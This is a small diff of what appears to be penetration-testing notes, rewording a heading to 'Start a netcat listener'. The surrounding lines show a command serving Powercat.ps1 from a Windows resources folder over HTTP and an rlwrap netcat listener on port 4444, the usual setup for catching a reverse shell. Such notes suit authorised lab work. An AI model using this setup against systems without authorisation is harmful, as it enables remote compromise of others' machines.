@@ -12,7 +12,7 @@ Serve Powercat.ps1
 cd /usr/share/windows-resources && python3 -m http.server 80
 ```
 
-Start listener
+Start a `netcat` listener
 
 ```
 rlwrap nc -lvnp 4444
